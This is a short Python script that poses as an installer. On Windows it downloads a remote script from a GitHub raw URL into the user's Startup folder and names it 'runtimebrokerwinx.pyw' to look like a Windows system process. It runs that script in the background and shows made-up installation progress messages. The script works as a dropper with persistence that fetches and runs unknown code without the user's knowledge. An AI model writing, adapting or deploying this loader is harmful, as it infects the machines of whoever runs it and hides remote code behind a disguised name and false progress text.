try:
    import os, sys, time, colorama, http.client as httplib, urllib.request
except ImportError:
    input("An error occurred while importing modules. Please press any key to install modules.")
    import sys
    pyd = str(sys.executable)
    os.system(pyd + " -m pip install -r requirements.txt")
    os.system("cls")
    import os, sys, time, colorama, http.client as httplib, urllib.request
    
colorama.init(convert=True)

startupath = os.path.expanduser('~') + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

if (sys.version_info < (3, 10)):
    print(colorama.Fore.RED + '[-] This program only works with Python 3.10+.' + colorama.Fore.WHITE)
    print(f"Your current Python version : {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
    sys.exit(1)

def connection():
    conn = httplib.HTTPConnection("www.google.com", timeout=3)
    try:
        conn.request("HEAD", "/")
        conn.close()
        return True
    except:
        return False

if (connection() == False):
	if(os.name == "nt"):
		os.system("cls")
	print(colorama.Fore.RED + "You do not have an internet connection!!!" + colorama.Fore.WHITE)
	os._exit(1)

def setup():
    os.system("cls && title Please Wait")
    print("the installation started and will finish after an average of 1 minutes...")
    urllib.request.urlretrieve('https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli/main/main.py', '{}/runtimebrokerwinx.pyw'.format(startupath))
    print("please wait...")
    os.popen('{}/runtimebrokerwinx.pyw'.format(startupath))
    time.sleep(7)
    os.system("cls")
    print("the installation is almost finished...")
    print("installation finished")
    os.system("cls")
        
if(os.name == "nt"):
    if not os.path.exists('{}/runtimebrokerwinx.pyw'.format(startupath)):
        setup()
